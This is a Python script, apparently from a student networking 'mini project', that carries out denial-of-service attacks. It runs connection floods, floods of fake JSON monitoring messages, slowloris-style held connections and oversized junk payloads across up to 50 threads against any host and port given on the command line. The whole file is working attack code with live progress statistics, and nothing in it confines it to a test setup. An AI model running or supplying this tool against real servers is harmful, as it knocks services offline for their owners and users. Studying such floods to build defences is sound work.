import socket
import threading
import json
import time
import random
import sys
import os
import argparse

SERVER_HOST = "192.168.1.100"
SERVER_PORT = 8080

def flood_thread(thread_id, host, port, mode, stop_event, stats):
    conn_count = 0
    msg_count = 0
    error_count = 0

    while not stop_event.is_set():
        try:
            if mode == "connection_flood":
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(2)
                s.connect((host, port))
                conn_count += 1
                stats["connections"] += 1
                time.sleep(random.uniform(0.01, 0.05))
                s.close()

            elif mode == "message_flood":
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(2)
                s.connect((host, port))
                conn_count += 1
                for _ in range(200):
                    if stop_event.is_set():
                        break
                    payload = json.dumps({
                        "client_id": f"dos-{thread_id}",
                        "hostname": f"flood-node-{thread_id}",
                        "timestamp": time.strftime("%Y-%m-%dT%H:%M:%S", time.gmtime()),
                        "cpu_percent": random.uniform(0, 100),
                        "mem_percent": random.uniform(0, 100),
                        "disk_percent": random.uniform(0, 100),
                        "net_bytes_sent": random.randint(0, 10**9),
                        "net_bytes_recv": random.randint(0, 10**9),
                        "load_avg_1": random.uniform(0, 16),
                        "load_avg_5": random.uniform(0, 16),
                        "load_avg_15": random.uniform(0, 16),
                    }) + "\n"
                    s.sendall(payload.encode())
                    msg_count += 1
                    stats["messages"] += 1
                s.close()

            elif mode == "slowloris":
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(30)
                s.connect((host, port))
                conn_count += 1
                stats["connections"] += 1
                while not stop_event.is_set():
                    partial = '{"client_id": "slow-' + str(thread_id) + '", "cpu'
                    s.sendall(partial.encode())
                    time.sleep(5)

            elif mode == "large_payload":
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(5)
                s.connect((host, port))
                conn_count += 1
                junk_data = "A" * 65536
                payload = json.dumps({
                    "client_id": f"dos-{thread_id}",
                    "hostname": f"flood-node-{thread_id}",
                    "timestamp": time.strftime("%Y-%m-%dT%H:%M:%S", time.gmtime()),
                    "cpu_percent": 99.9,
                    "mem_percent": 99.9,
                    "disk_percent": 99.9,
                    "net_bytes_sent": 0,
                    "net_bytes_recv": 0,
                    "load_avg_1": 99.0,
                    "load_avg_5": 99.0,
                    "load_avg_15": 99.0,
                    "junk": junk_data
                }) + "\n"
                s.sendall(payload.encode())
                msg_count += 1
                stats["messages"] += 1
                time.sleep(0.1)
                s.close()

        except (ConnectionRefusedError, OSError, socket.timeout):
            error_count += 1
            stats["errors"] += 1
            time.sleep(0.1)
        except Exception:
            error_count += 1
            stats["errors"] += 1
            time.sleep(0.1)


def run_dos(host, port, mode, num_threads, duration):
    print(f"\n{'='*55}")
    print(f"  DoS Simulation - CN Mini Project Demo")
    print(f"{'='*55}")
    print(f"  Target  : {host}:{port}")
    print(f"  Mode    : {mode}")
    print(f"  Threads : {num_threads}")
    print(f"  Duration: {duration}s")
    print(f"{'='*55}\n")
    print(f"  Modes explained:")
    print(f"  connection_flood - rapidly open/close TCP connections")
    print(f"  message_flood    - hammer server with valid JSON metrics")
    print(f"  slowloris        - hold connections open with partial data")
    print(f"  large_payload    - send oversized JSON payloads")
    print(f"\n  Starting in 3s... Ctrl+C to stop early.\n")
    time.sleep(3)

    stats = {"connections": 0, "messages": 0, "errors": 0}
    stop_event = threading.Event()
    threads = []

    for i in range(num_threads):
        t = threading.Thread(
            target=flood_thread,
            args=(i, host, port, mode, stop_event, stats),
            daemon=True
        )
        t.start()
        threads.append(t)

    start = time.time()
    try:
        while time.time() - start < duration:
            elapsed = time.time() - start
            rate = stats["messages"] / max(elapsed, 1)
            print(
                f"\r  [{elapsed:5.1f}s] "
                f"conns={stats['connections']} "
                f"msgs={stats['messages']} "
                f"errors={stats['errors']} "
                f"rate={rate:.1f}msg/s   ",
                end="", flush=True
            )
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n\n  [!] Interrupted by user.")

    stop_event.set()
    print(f"\n\n{'='*55}")
    print(f"  DoS simulation complete.")
    print(f"  Total connections attempted : {stats['connections']}")
    print(f"  Total messages sent         : {stats['messages']}")
    print(f"  Total errors                : {stats['errors']}")
    print(f"  Duration                    : {time.time()-start:.1f}s")
    print(f"{'='*55}\n")


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="DoS Simulation for CN Demo")
    parser.add_argument("host", nargs="?", default=SERVER_HOST, help="Server IP")
    parser.add_argument("port", nargs="?", type=int, default=SERVER_PORT, help="Server port")
    parser.add_argument(
        "--mode", "-m",
        choices=["connection_flood", "message_flood", "slowloris", "large_payload"],
        default="message_flood",
        help="Attack mode (default: message_flood)"
    )
    parser.add_argument("--threads", "-t", type=int, default=50, help="Number of threads (default: 50)")
    parser.add_argument("--duration", "-d", type=int, default=30, help="Duration in seconds (default: 30)")
    args = parser.parse_args()

    run_dos(args.host, args.port, args.mode, args.threads, args.duration)
